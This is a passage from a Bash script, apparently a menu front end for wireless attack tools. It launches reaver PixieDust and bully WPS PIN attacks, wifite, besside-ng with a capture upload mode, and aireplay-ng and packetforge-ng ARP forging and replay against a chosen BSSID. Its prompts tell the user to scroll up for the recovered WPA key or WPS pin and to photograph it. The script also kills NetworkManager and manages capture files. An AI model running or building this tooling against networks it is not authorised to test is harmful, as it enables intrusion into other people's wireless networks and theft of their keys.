\"2\"\n\n\n\tkillAirodump\n\tkillWash\n\tkillWifite\n\n\tgetBSSIDCharOnly\n\n\t# Choose WPS Attack Method\n\tcase \"$attackMethodWPS\" in\n\n\t\t\"reaver\")\n\t\treaverSaveAllSessionFiles\n\t\tmenuAttacksWPS\n\t\t;;\n\n\t\t\"bully\")\n\t\tmenuBullyMain\n\t\t;;\n\n\tesac\n\n}\n\n\nautoModeUsePreviousSessionWPS(){\n\n\tcurrentTask=\"autoModeUsePreviousSessionWPS\"\n\n\tsessionWriteLoadPrevious\n\n\tmenuAttacksWPS\n\n}\n\n\nmenuAttacksWPS(){\n\n\tcurrentTask=\"menuAttacksWPS\"\n\n\tbanner\n\tbannerStats\n\n\t# Set Default Choice\n\tpixieChoice=\"1\"\n\n\techo \"\"\n\techo \"1) Continue With PixieDust ENABLED (Recommended)\"\n\techo \"\"\n\techo \"2) Continue With PixieDust DISABLED\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"Choose an Option and Press ENTER to continue\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\t$green\n\techo \"If No Selection Is Made, It Will Continue Automatically Using PixieDust\"\n\t$white\n\techo \"\"\n\techo \"\"\n\techo \"Continuing In 10 Seconds....\"\n\techo \"\"\n\techo \"\"\n\n\tread -t 10 pixieChoice\n\n\thotkeyInput=\"$pixieChoice\"\n\n\tloadMenuHotkeys \"$hotkeyInput\"\n\n\tcase \"$pixieChoice\" in\n\n\t\t\"\")\n\t\t#menuAttacksWPS\n\t\tpixieChoice=\"1\"\n\t\tsleepMessage1=\"Preparing Reaver/PixieDust Session....\"\n\t\tsleepMessage2=\"Launching Reaver/PixieDust Session....\"\n\t\tsleepMessage3=\"Reaver Session Sprinkled With PixieDust Is Now Active!\"\n\t\t;;\n\n\t\t\"1\")\n\t\tpixieChoice=\"1\"\n\t\tsleepMessage1=\"Preparing Reaver/PixieDust Session....\"\n\t\tsleepMessage2=\"Launching Reaver/PixieDust Session....\"\n\t\tsleepMessage3=\"Reaver Session Sprinkled With PixieDust Is Now Active!\"\n\t\t;;\n\n\t\t\"2\")\n\t\tpixieChoice=\"2\"\n\t\tsleepMessage1=\"Preparing Reaver Session....\"\n\t\tsleepMessage2=\"Launching Reaver Session....\"\n\t\tsleepMessage3=\"Reaver Session Is Now Active!\"\n\t\t;;\n\n\t\t*)\n\t\tmenuAttacksWPS\n\t\t;;\n\n\tesac\n\n\tdoSleepMessage \"$sleepMessage1\" \"1\"\n\n\tkillAirodump\n\tkillWash\n\n\tdisableChannelHopping\n\n\tdoSleepMessage \"$sleepMessage1\" \"1\"\n\n\tdoSleepMessage \"$sleepMessage2\" \"2\"\n\n\tbanner\n\tbannerStats\n\n\tdoSleepMessage \"$sleepMessage3\" \"0\" \"$green\"\n\t$white\n\techo \"\"\n\techo \"Press CTRL+C At Any Time To Stop Current Session and Save\"\n\tsleep 2\n\n\tcase \"$pixieChoice\" in\n\t\n\t\t\"1\")\n\t\t#echo \"PixeDust Enabled\"\n\t\t#$reaver -i $interfaceMonitor -b $bssid -c $channel -S -vv -K $pixieNumber\n\t\t$reaver -i $interfaceMonitor -b $bssid -c $channel -vv -K $pixieNumber\n\t\t#read pause\n\t\t#pixieFailed=\"1\"\n\n\t\treaverSessionComplete\n\n\t\tcase \"$pixieFailed\" in\n\t\n\t\t\t\"1\")\n\t\t\tbanner\n\t\t\tbannerStats\n\t\t\techo \"Pixie Attack Failed! Starting Normal Reaver Attack\"\n\t\t\techo \"\"\n\t\t\techo \"\"\n\t\t\t$white\n\t\t\treaverMenuAttacksWPS\n\t\t\t;;\n\n\t\tesac\n\t\t;;\n\t\n\t\t\"2\")\n\t\t#echo \"PixeDust Disabled\"\n\t\t#$reaver -i $interfaceMonitor -b $bssid -c $channel -S -vv\n\t\t#$reaver -i $interfaceMonitor -b $bssid -c $channel -vv\n\n\t\treaverMenuAttacksWPS\n\t\t;;\n\n\tesac\n\n}\n\n\nreaverMenuAttacksWPS(){\n\n\tcurrentTask=\"reaverMenuAttacksWPS\"\n\n\tbanner\n\tbannerStats\n\n\tsleepMessage1=\"Preparing Reaver Session....\"\n\tsleepMessage2=\"Launching Reaver Session....\"\n\tsleepMessage3=\"Reaver Session Is Now Active!\"\n\n\tdoSleepMessage \"$sleepMessage1\" \"1\"\n\n\tkillAirodump\n\tkillWash\n\n\tdisableChannelHopping\n\n\tdoSleepMessage \"$sleepMessage1\" \"1\"\n\n\tdoSleepMessage \"$sleepMessage2\" \"1\"\n\n\tbanner\n\tbannerStats\n\n\tdoSleepMessage \"$sleepMessage3\" \"0\" \"$green\"\n\t$white\n\techo \"\"\n\techo \"Press CTRL+C At Any Time To Stop Current Session and Save\"\n\tsleep 2\n\t\n\t$reaver -i $interfaceMonitor -b $bssid -c $channel -S -vv\n\n\t# Set pixieChoice To 0 For Triggering Normal Reaver Save Session Screen\n\tpixieChoice=\"0\"\n\n\treaverSessionComplete\n\n}\n\n\nreaverSessionComplete(){\n\n\tcurrentTask=\"reaverSessionComplete\"\n\n\t# Session has ended lands here\n\tgetBSSIDCharOnly\n\n\techo \"\"\n\t$lightBlue\n\techo \"***************************************\"\n\techo \"** SCROLL UP FOR RECOVERED PASSWORD ***\"\n\techo \"***************************************\"\n\techo \"\"\n\t#$magenta\n\t#echo \"Attempting To Save Reaver Session....\"\n\t#echo \"\"\n\t#echo \"** Will Give Error If No Session Has Been Written **\"\n\t#echo \"\"\n\treaverSaveCurrentSessionFile\n\n\t$green\n\techo \"\"\n\techo \"***************************************\"\n\techo \"* Your reaver session has been saved! *\"\n\techo \"***************************************\"\n\t$white\n\techo \"\"\n\t$yellow\n\n\t# Check if PixieDust was used\n\tcase \"$pixieChoice\" in\n\n\t\t\"0\")\n\t\techo \"If the key is available, now would be a good time to do the following:\"\n\t\techo \"\"\n\t\techo \"- Write down or take a picture of the WPA/WPA2 key and/or WPS pin\"\n\t\techo \"\"\n\t\techo \"\"\n\t\t$cyan\n\t\techo \"** YOU MAY NEED TO SCROLL UP TO SEE THE PASSPHRASE / PIN / ESSID **\"\n\t\t$white\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"Press ENTER to continue....\"\n\t\techo \"\"\n\n\t\tread pause\n\t\t;;\n\n\t\t\"1\")\n\t\techo \"If the key is available, now would be a good time to do the following:\"\n\t\techo \"\"\n\t\techo \"- Write down or take a picture of the WPA/WPA2 key and/or WPS pin\"\n\t\techo \"\"\n\t\techo \"\"\n\t\t$cyan\n\t\techo \"** YOU MAY NEED TO SCROLL UP TO SEE THE PASSPHRASE / PIN / ESSID **\"\n\t\techo \"\"\n\t\t$cyan\n\t\techo \"* IF PIXIEDUST ATTACK FAILED, USE THE \\\"R\\\" OPTION TO START NORMAL REAVER ATTACK *\"\n\t\t$white\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"Press ENTER to continue or type \\\"R\\\" to start normal Reaver attack....\"\n\t\techo \"\"\n\n\t\tread pixiePost\n\n\t\tcase \"$pixiePost\" in\n\t\t\n\t\t\t\"R\" | \"r\")\n\t\t\tbanner\n\t\t\tbannerStats\n\t\t\techo \"Pixie Attack Failed! Starting Normal Reaver Attack\"\n\t\t\techo \"\"\n\t\t\techo \"\"\n\t\t\t$white\n\t\t\treaverMenuAttacksWPS\n\t\t\t;;\n\n\t\tesac\n\t\t;;\n\n\tesac\n\n\tmenuMain\n\n}\n\nmenuAttacksWPSWifiteAuto(){\n\n\tcurrentTask=\"menuAttacksWPSWifiteAuto\"\n\tlastMenuID=\"menuAttacksWPSWifiteAuto\"\n\n\tkillAll\n\n\t#$terminal $wifiteAttackWPS -c $channel -b $bssid -e $essid -wepsave -wepca 1000 &\n\t$terminal $wifiteAttackWPS &\n\n\tbanner\n\tbannerStats\n\n\techo \"\"\n\techo \"The wifite session should be launched in a separate window.\"\n\techo \"\"\n\techo \"PRESS ENTER ONLY WHEN THE SESSION HAS FINISHED!\"\n\techo \"\"\n\techo \"AS SOON AS ENTER IS PRESSED THE WIFITE SESSION WILL BE RESET!\"\n\techo \"\"\n\n\tread pause\n\n\techo \"\"\n\techo \"\"\n\techo \"Your wifite session has been saved!\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"If the key is available, now would be a good time to do the following:\"\n\techo \"\"\n\techo \"1) Write down the WPA/WPA2 key and/or WPS pin\"\n\techo \"\"\n\techo \"2) Take a picture of the screen to keep a record of the keys\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"Press ENTER to continue....\"\n\techo \"\"\n\techo \"\"\n\n\tkillAll\n\tmenuAuto\n\n\tread pause\n\n}\n\n\naircrackDecryptWPS(){\n\n\t# NOT ACTUALLY USED FOR WPS ATTACK\n\n\tcurrentTask=\"aircrackDecryptWPS\"\n\n\tblank=\"\"\n\n}\n\n\nreaverSaveCurrentSessionFile(){\n\n\tcurrentTask=\"reaverSaveCurrentSessionFile\"\n\n\t# Use current session path and bssid to build variable\n\treaverCurrentSessionFile=\"../../$reaverSessionPath/$bssidCharOnly.wpc\"\n\n\t# Check BSSID and only continue if not blank\n\tif [ \"$bssidCharOnly\" != \"\" ];then\n\n\t\t# Check to see if reaver session file exists\n\t\tif [ -e $reaverCurrentSessionFile ];then\n\t\t\t\n\t\t\t# Copy reaver session file to current WPS sessions directory\n\t\t\tcp \"$reaverCurrentSessionFile\" \"$capturePathWPS\"\n\n\t\tfi\n\n\tfi\n\n}\n\n\nreaverSaveAllSessionFiles(){\n\ncurrentTask=\"reaverSaveCurrentSessionFile\"\n\n\t# Check BSSID and only continue if not blank\n\tif [ \"$bssidCharOnly\" != \"\" ];then\n\n\t\tcp \"../../$reaverSessionPath/*.wpc\" \"$capturePathWPS\"\n\n\tfi\n\n}\n\n\nmenuBullyMain() {\n\n\tcurrentTask=\"menuBullyMain\"\n\n\tbanner\n\techo \"\"\n\techo \"Bully WPS Attack Menu\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"Choose an option and press ENTER:\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\n\tread pause\n\n}\n\n\nmenuWashMain() {\n\n\t#currentTask=\"menuWashMain\"\n\n\tbanner\n\techo \"\"\n\techo \"WPS Wash Menu\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"Choose an option and press ENTER:\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"1) Use Defaults\"\n\techo \"\"\n\techo \"2) Enter Channel Number\"\n\techo \"\"\n\techo \"3) Toggle Scan Mode\"\n\techo \"\"\n\techo \"4) Use 5GHz Band\"\n\techo \"\"\n\techo \"5) Do Not Ignore Frame Checksum Errors\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"R) Return To Previous Page\"\n\techo \"\"\n\techo \"\"\n\n\tread washOption\n\n\tcase \"$washOption\" in\n\n\t\t\"1\")\n\t\twash -i $interfaceMonitor -o \"$washFile\" -C\n\t\t;;\n\n\t\t\"2\")\n\t\twash -i $interfaceMonitor -o \"$washFile\" -C -c $washChannel\n\t\t;;\n\n\t\t\"3\")\n\t\twash -i $interfaceMonitor -o \"$washFile\" -C -s\n\t\t;;\n\n\t\t\"4\")\n\t\twash -i $interfaceMonitor -o \"$washFile\" -C -5\n\t\t;;\n\n\t\t\"5\")\n\t\twash -i $interfaceMonitor -o \"$washFile\"\n\t\t;;\n\n\t\t\"6\")\n\t\tcurrentTask\n\t\t;;\n\n\tesac\n\n}\n\n\n\n############################################################################\n#   ATTACKS: WPS END   #####################################################\n############################################################################\n\n\n\n\n############################################################################\n#   ATTACKS: UNIVERSAL BEGIN   #############################################\n############################################################################\n\nmenuAttacksAllWifiteAuto(){\n\n\tcurrentTask=\"menuAttacksAllWifiteAuto\"\n\tlastMenuID=\"menuAttacksAllWifiteAuto\"\n\n\tkillAll\n\n\t$terminal $wifiteAttackAll &\n\n\tbanner\n\tbannerStats\n\n\techo \"\"\n\techo \"The wifite session should be launched in a separate window.\"\n\techo \"\"\n\techo \"PRESS ENTER ONLY WHEN THE SESSION HAS FINISHED!\"\n\techo \"\"\n\techo \"AS SOON AS ENTER IS PRESSED THE WIFITE SESSION WILL BE RESET!\"\n\techo \"\"\n\n\tread pause\n\n\tkillAll\n\tmenuMain\n\n}\n\n\ngenerateArpPacket(){\n\n\tcurrentTask=\"generateArpPacket\"\n\n\t$terminal aireplay-ng -4 $interfaceMonitor &\n\t\n\t# Alt\n\t$terminal aireplay-ng -4 -h $macAddressMonitor $interfaceMonitor &\n\n}\n\n\ntcpDump(){\n\n\tcurrentTask=\"tcpDump\"\n\n\t# Accepts a CAP file as INPUT\n\t$terminal tcpdump -s 0 -n -e -r $1 &\n\t\n}\n\n\nforgeArpRequest(){\n\n\tcurrentTask=\"forgeArpRequest\"\n\n\t# Accepts an XOR file as INPUT\n\t#packetforge-ng -0 -a $bssid -h $macAddressMonitor -k 192.168.1.2 -l 192.168.1.100 -y $1 -w \"$initPath/$bssid-arp.cap\" &\n\n\t# Accepts an XOR file as INPUT and a CAP file as OUTPUT\n\tpacketforge-ng -0 -a $bssid -h $macAddressMonitor -k 192.168.1.2 -l 192.168.1.100 -y $1 -w $2 &\n\n}\n\n\nreplayArpRequest(){\n\n\tcurrentTask=\"replayArpRequest\"\n\n\taireplay-ng -2 -r \"$initPath/$bssid-arp.cap\" $interfaceMonitor &\n\n\t# Accepts a CAP file as INPUT\n\t#aireplay-ng -2 -r $1 $interfaceMonitor &\n\n}\n\n\n\n############################################################################\n#   ATTACKS: UNIVERSAL END   ###############################################\n############################################################################\n\n\n\n\n############################################################################\n#   BESSIDE-NG STUFF BEGIN   ###############################################\n############################################################################\n\n\nbessideMain(){\n\n\tcurrentTask=\"bessideMain\"\n\n\tbanner\n\tbannerStats\n\n\techo \"\"\n\techo \"Select a mode and press ENTER:\"\n\techo \"\"\n\techo \"\"\n\techo \"1) Normal\"\n\techo \"\"\n\techo \"2) WPA Only\"\n\techo \"\"\n\techo \"3) Upload\"\n\techo \"\"\n\techo \"4) Set Flood Rate\"\n\techo \"\"\n\techo \"5) Return To Previous Menu\"\n\techo \"\"\n\techo \"\"\n\n\tread getBessideMode\n\n\thotkeyInput=\"$getBessideMode\"\n\n\tloadMenuHotkeys \"$hotkeyInput\"\n\n\tcase \"$getBessideMode\" in\n\n\t\t\"\")\n\t\tbessideMain\n\t\t;;\n\n\t\t\"1\")\n\t\tbessideNormal\n\t\t;;\n\n\t\t\"2\")\n\t\tbessideWPAOnly\n\t\t;;\n\n\t\t\"3\")\n\t\tbessideUpload\n\t\t;;\n\n\t\t\"4\")\n\t\tbessideSetFloodRate\n\t\t;;\n\n\t\t\"5\")\n\t\t$lastMenuID\n\t\t;;\n\n\t\t*)\n\t\tbessideMain\n\t\t;;\n\n\tesac\n\n}\n\n\nbessideNormal(){\n\n\tcurrentTask=\"bessideNormal\"\n\n\t$terminal besside-ng -b $bssid -c $channel -vv $interfaceMonitor\n\n}\n\n\nbessideUpload(){\n\n\tcurrentTask=\"bessideUpload\"\n\n\t$terminal besside-ng -b $bssid -c $channel -s $serverWPA -vv $interfaceMonitor\n\n}\n\n\nbessideWPAOnly(){\n\n\tcurrentTask=\"bessideWPAOnly\"\n\n\t$terminal besside-ng -b $bssid -c $channel -W -vv $interfaceMonitor\n\n}\n\n\nbessideSetFloodRate(){\n\n\tcurrentTask=\"bessideSetFloodRate\"\n\n\tbessideFloodRate=\"\"\n\n}\n\n\n############################################################################\n#   BESSIDE-NG STUFF END   #################################################\n############################################################################\n\n\n\n\n############################################################################\n#   POST EXPLOITATION BEGIN   ##############################################\n############################################################################\n\n\n\n\n\n\n############################################################################\n#   POST EXPLOITATION END   ################################################\n############################################################################\n\n\n\n\n############################################################################\n#   PROCESS MANAGEMENT BEGIN   #############################################\n############################################################################\n\n\nkillProcesses(){\n\n\tcurrentTask=\"killProcesses\"\n\n\tkillall NetworkManager\n\tkillall NetworkManagerDispatcher\n\t#killall wpa_supplicant\n\t#killall avahi-daemon\n\n}\n\n\nrestartProcesses(){\n\n\tcurrentTask=\"restartProcesses\"\n\n\t#killall NetworkManager\n\tNetworkManager\n\n\t#killall NetworkManagerDispatcher\n\tNetworkManagerDispatcher\n\n\t#wpa_supplicant\n\t#avahi-daemon\n\n}\n\n\nkillWifite(){\n\n\tcurrentTask=\"killWifite\"\n\n\tfindWifitePID=$(ps -A | grep \"wifite\" | head -c5)\n\n\tcase \"$findWifitePID\" in\n\n\t\t\"\")\n\t\t# No Process Found\n\t\t;;\n\n\t\t*)\n\t\tkillWifiteTemp=$(kill $findWifitePID)\n\t\t;;\n\tesac\n\t\n\n}\n\n\nkillAirodump(){\n\n\tcurrentTask=\"killAirodump\"\n\n\tfindAirodumpPID=$(ps -A | grep \"airodump-ng\" | head -c5)\n\n\tcase \"$findAirodumpPID\" in\n\n\t\t\"\")\n\t\t# No Process Found\n\t\t;;\n\n\t\t*)\n\t\tkillAirodumpTemp=$(kill $findAirodumpPID)\n\t\t#killAirodumpTemp=$(killall airodump-ng)\n\t\t;;\n\tesac\n\n}\n\n\nkillAireplay(){\n\n\tcurrentTask=\"killAireplay\"\n\n\tfindAireplayPID=$(ps -A | grep \"aireplay-ng\" | head -c5)\n\n\tcase \"$findAireplayPID\" in\n\n\t\t\"\")\n\t\t# No Process Found\n\t\t;;\n\n\t\t*)\n\t\tkillAireplayTemp=$(kill $findAireplayPID)\n\t\t;;\n\tesac\n\n}\n\n\nkillAircrack(){\n\n\tcurrentTask=\"killAircrack\"\n\n\tfindAircrackPID=$(ps -A | grep \"aircrack-ng\" | head -c5)\n\n\tcase \"$findAircrackPID\" in\n\n\t\t\"\")\n\t\t# No Process Found\n\t\t;;\n\n\t\t*)\n\t\tkillAircrackTemp=$(kill $findAircrackPID)\n\t\t;;\n\tesac\n\n}\n\n\nkillWash(){\n\n\tcurrentTask=\"killWash\"\n\n\tfindWashPID=$(ps -A | grep \"wash\" | head -c5)\n\n\tcase \"$findWashPID\" in\n\n\t\t\"\")\n\t\t# No Process Found\n\t\t;;\n\n\t\t*)\n\t\tkillAircrackTemp=$(kill $findWashPID)\n\t\t;;\n\tesac\n\n}\n\n\nkillAll(){\n\n\tkillAirodump\n\tkillAireplay\n\tkillAircrack\n\tkillWash\n\tkillWifite\n\n}\n\n\n############################################################################\n#   PROCESS MANAGEMENT END   ###############################################\n############################################################################\n\n\n\n\n\n############################################################################\n#   SESSIONS STUFF BEGIN   #################################################\n############################################################################\n\n\ncleanSessionFiles(){\n\n\tcurrentTask=\"cleanSessionFiles\"\n\n\tbanner\n\techo \"\"\n\t$red\n\techo \"*** THIS WILL ERASE ALL CURRENT SESSION FILES!!!\"\n\t$white\n\techo \"\"\n\techo \"\"\n\techo \"If you would like to create a backup before doing this, press B and ENTER\"\n\techo \"\"\n\techo \"\"\n\techo \"If you would like to CANCEL, press C and ENTER\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\t$cyan\n\techo \"Automatically Continuing In 10 Seconds\"\n\t$white\n\techo \"\"\n\techo \"\"\n\n\tread -t 10 eraseSessionConfirm\n\n\tcase \"$eraseSessionConfirm\" in\n\n\t\t\"\")\n\t\tbanner\n\t\techo \"\"\n\t\techo \"Cleaning Session Files....\"\n\t\techo \"\"\n\t\techo \"\"\n\n\t\t#rm \"$capturePath/wep/wep.sessions\"\n\t\t#rm \"$capturePath/wps/wps.sessions\"\n\t\t#rm \"$capturePath/wpa/wpa.sessions\"\n\t\t#rm \"$capturePath/wpa2/wpa2.sessions\"\n\n\t\trm -r \"$capturePath\"\n\t\tsleep 1\n\t\tmkdir \"$capturePath\"\n\n\t\tbanner\n\t\techo \"\"\n\t\techo \"Cleaning Session Files....\"\n\t\techo \"\"\n\t\techo \"\"\n\t\t;;\n\n\t\t\"c\" | \"C\")\n\t\tmenuExtras\n\t\t;;\n\n\t\t\"b\" | \"B\")\n\t\tbackupFromSessionErase=\"1\"\n\t\tbackupSessionFiles\n\t\t;;\n\n\t\t*)\n\t\tcleanSessionFiles\n\t\t;;\n\n\tesac\n\n}\n\n\nbackupSessionFiles(){\n\n\tcurrentTask=\"backupSessionFiles\"\n\n\tbackupName=\"sessions-backup-$displayDate3\"\n\tbackupDir=\"sessions\"\n\t#nextBackupSlot=0\n\n\tif [ -f \"$backupName.zip\" ]; then \n\t\tnextBackupSlot=$((nextBackupSlot+1))\n\t\tbackupName=\"$backupName-$nextBackupSlot\"\n\tfi\n\t\t\n\n\t#echo \"$backupName\"\n\t#echo \"$nextBackupSlot\"\n\t#read pause\n\n\tbanner\n\techo \"\"\n\techo \"Backing Up Session Files To:\"\n\techo \"\"\n\t$cyan\n\techo \"$backupName....\"\n\t$white\n\techo \"\"\n\techo \"\"\n\n\tcase \"$backupFromCaptureErase\" in\n\n\t\t\"1\")\n\t\tsessionCopyNewCaptureFiles\n\t\tbanner\n\t\techo \"\"\n\t\tsleep 2\n\t\tzip -9 -r $backupName $backupDir\n\t\tsleep 1\n\t\tcleanCaptureFiles\n\t\tbackupFromCaptureErase=\"0\"\n\t\t;;\n\tesac\n\n\tcase \"$backupFromSessionErase\" in\n\n\t\t\"0\")\n\t\tsleep 3\n\t\tzip -9 -r $backupName $backupDir\n\t\t;;\n\n\t\t\"1\")\n\t\tsleep 2\n\t\tzip -9 -r $backupName $backupDir\n\t\tsleep 1\n\t\tcleanSessionFiles\n\t\tbackupFromSessionErase=\"0\"\n\t\t;;\n\tesac\n\n}\n\n\nsessionWriteBeginNew(){\n\n\tcurrentTask=\"sessionWriteBeginNew\"\n\n\tgetCurrentDateAndTime\n\n\techo \"\" >> \"$capturePath/$encryptionType/$encryptionType.sessions\"\n\techo \"***** Begin New Session - $displayDateAndTime *****\" >> \"$capturePath/$encryptionType/$encryptionType.sessions\"\n\techo \"\" >> \"$capturePath/$encryptionType/$encryptionType.sessions\"\n\techo \"Encryption: $encryptionTypeText\" >> \"$capturePath/$encryptionType/$encryptionType.sessions\"\n\techo \"ESSID: $essid\" >> \"$capturePath/$encryptionType/$encryptionType.sessions\"\n\techo \"BSSID: $bssid\" >> \"$capturePath/$encryptionType/$encryptionType.sessions\"\n\techo \"Channel: $channel\" >> \"$capturePath/$encryptionType/$encryptionType.sessions\"\n\techo \"\" >> \"$capturePath/$encryptionType/$encryptionType.sessions\"\n\n}\n\n\nsessionWriteLoadPrevious(){\n\n\tcurrentTask=\"sessionWriteLoadPrevious\"\n\n\tgetCurrentDateAndTime\n\n\techo \"\" >> \"$capturePath/$encryptionType/$encryptionType.sessions\"\n\techo \"***** Load Previous Session - $displayDateAndTime *****\" >> \"$capturePath/$encryptionType/$encryptionType.sessions\"\n\techo \"\" >> \"$capturePath/$encryptionType/$encryptionType.sessions\"\n\techo \"Encryption: $encryptionTypeText\" >> \"$capturePath/$encryptionType/$encryptionType.sessions\"\n\techo \"ESSID: $essid\" >> \"$capturePath/$encryptionType/$encryptionType.sessions\"\n\techo \"BSSID: $bssid\" >> \"$capturePath/$encryptionType/$encryptionType.sessions\"\n\techo \"Channel: $channel\" >> \"$capturePath/$encryptionType/$encryptionType.sessions\"\n\techo \"\" >> \"$capturePath/$encryptionType/$encryptionType.sessions\"\n\n}\n\n\nsessionWriteEndCurrent(){\n\n\tcurrentTask=\"sessionWriteEndCurrent\"\n\n\tgetCurrentDateAndTime\n\n\techo \"\" >> \"$capturePath/$encryptionType/$encryptionType.sessions\"\n\techo \"***** End Current Session - $displayDateAndTime *****\" >> \"$capturePath/$encryptionType/$encryptionType.sessions\"\n\techo \"\" >> \"$capturePath/$encryptionType/$encryptionType.sessions\"\n\n}\n\n\nsessionRemoveEmpty(){\n\n\tcurrentTask=\"sessionRemoveEmpty\"\n\n\t#banner\n\t#echo \"\"\n\t#echo \"Removing Empty Sessions....\"\n\t#echo \"\"\n\t#echo \"\"\n\n\trm \"$capturePath/$encryptionType/empty.sessions\"\n\trmdir \"$capturePath/empty\"\n\n\tbanner\n\techo \"\"\n\t#echo \"Removing Empty Sessions....\"\n\t#echo \"\"\n\t#echo \"\"\n\n}\n\n\nsessionCreatePaths(){\n\n\tgetBSSIDCharOnly\n\n\tmkdir \"$capturePath\"\n\tmkdir \"$capturePath/$encryptionType/\"\n\n}\n\n\nsessionCopyNewCaptureFiles(){\n\n\tcp *.cap \"$capturePath/$encryptionType\"\n\tcp *.ivs \"$capturePath/$encryptionType\"\n\tcp *.xor \"$capturePath/$encryptionType\"\n\tcp *.csv \"$capturePath/$encryptionType\"\n\tcp *.netxml \"$capturePath/$encryptionType\"\n\n}\n\n\nsessionSave(){\n\n\tcurrentTask=\"sessionSave\"\n\n\tgetCurrentDateAndTime\n\n\techo \"\" >> \"$capturePath/$encryptionType/$encryptionType.sessions\"\n\techo \"***** Save Current Session - $displayDateAndTime *****\" >> \"$capturePath/$encryptionType/$encryptionType.sessions\"\n\techo \"\" >> \"$capturePath/$encryptionType/$encryptionType.sessions\"\n\techo \"Encryption: $encryptionTypeText\" >> \"$capturePath/$encryptionType/$encryptionType.sessions\"\n\techo \"ESSID: $essid\" >> \"$capturePath/$encryptionType/$encryptionType.sessions\"\n\techo \"BSSID: $bssid\" >> \"$capturePath/$encryptionType/$encryptionType.sessions\"\n\techo \"Channel: $channel\" >> \"$capturePath/$encryptionType/$encryptionType.sessions\"\n\techo \"\" >> \"$capturePath/$encryptionType/$encryptionType.sessions\"\n\n}\n\n\nsessionLoad(){\n\n\tbanner\n\tbannerStats\n\n\tcurrentTask=\"sessionLoad\"\n\n\twhile read line           \n\tdo           \n\t\techo -e \"$line \\n\"           \n\tdone <\"$capturePath/$encryptionType/$encryptionType.sessions\"\n\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"Scroll up to see all loaded sessions.\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"Press ENTER to continue....\"\n\techo \"\"\n\techo \"\"\n\n\tread pause\n\n}\n\n\ncleanCaptureFiles(){\n\n\tcurrentTask=\"cleanCaptureFiles\"\n\n\tbanner\n\techo \"\"\n\t$red\n\techo \"*** THIS WILL ERASE ALL CURRENT CAPTURE FILES!!!\"\n\t$white\n\techo \"\"\n\techo \"\"\n\techo \"If you would like to create a backup before doing this, press B and ENTER\"\n\techo \"\"\n\techo \"\"\n\techo \"If you would like to CANCEL, press C and ENTER\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"Files will be copied to the \\\"/sessions/\\\" directory and backed up to a ZIP file\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\t$cyan\n\techo \"Automatically Continuing In 10 Seconds...\"\n\t$white\n\techo \"\"\n\techo \"\"\n\n\tread -t 10 eraseCaptureConfirm\n\n\tcase \"$eraseCaptureConfirm\" in\n\n\t\t\"\")\n\t\tbanner\n\t\techo \"\"\n\t\techo \"Cleaning Capture Files....\"\n\t\techo \"\"\n\t\techo \"\"\n\n\t\tsleep 3\n\n\t\trm *.cap\n\t\trm *.ivs\n\t\trm *.xor\n\t\trm *.csv\n\t\trm *.netxml\n\t\t;;\n\n\t\t\"c\" | \"C\")\n\t\tmenuExtras\n\t\t;;\n\n\t\t\"b\" | \"B\")\n\t\tbackupFromCaptureErase=\"1\"\n\t\tbackupSessionFiles\n\t\t;;\n\n\t\t*)\n\t\tcleanCaptureFiles\n\t\t;;\n\n\tesac\n\n}\n\n\nfindCaptureFiles(){\n\n\tcurrentTask=\"findCaptureFiles\"\n\n\tlistCap=$(ls | grep .cap)\n\tlistIvs=$(ls | grep .ivs)\n\tlistXor=$(ls | grep .xor)\n\tlistCsv=$(ls | grep .csv)\n\tlistNetXml=$(ls | grep .netxml)\n\n}\n\n\n############################################################################\n#   SESSIONS STUFF END   ###################################################\n############################################################################\n\n\n\n\n\n############################################################################\n#   EMPTY VARIABLE CHECKS BEGIN   ##########################################\n############################################################################\n\n\ncheckForEmptyEncryptionType(){\n\n\tcurrentTask=\"checkForEmptyEncryptionType\"\n\n\tif [ \"$encryptionType\" == \"empty\" ];then\n\n\t\tbanner\n\t\tbannerStats\n\n\t\techo \"\"\n\t\techo \"There is currently no Encryption Type selected!\"\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"Press ENTER to return to main menu....\"\n\t\techo \"\"\n\t\techo \"\"\n\n\t\tread pause\n\n\t\tmenuMain\n\tfi\n\n}\n\n\ncheckForEmptyCredentials(){\n\n\tcurrentTask=\"checkForEmptyCredentials\"\n\n\tcase \"$1\" in\n\n\t\t\"bssid\")\n\t\tif [ \"$bssid\" == \"\" ];then\n\n\t\t\tbanner\n\t\t\tbannerStats\n\n\t\t\techo \"\"\n\t\t\techo \"There is currently no BSSID saved in the previous session!\"\n\t\t\techo \"\"\n\t\t\techo \"\"\n\t\t\techo \"Press ENTER to return to previous menu....\"\n\t\t\techo \"\"\n\t\t\techo \"\"\n\n\t\t\tread pause\n\n\t\t\t$lastMenuID\n\t\tfi\n\t\t;;\n\n\t\t\"essid\")\n\t\tif [ \"$essid\" == \"\" ];then\n\n\t\t\tbanner\n\t\t\tbannerStats\n\n\t\t\techo \"\"\n\t\t\techo \"There is currently no ESSID saved in the previous session!\"\n\t\t\techo \"\"\n\t\t\techo \"\"\n\t\t\techo \"Press ENTER to return to previous menu....\"\n\t\t\techo \"\"\n\t\t\techo \"\"\n\n\t\t\tread 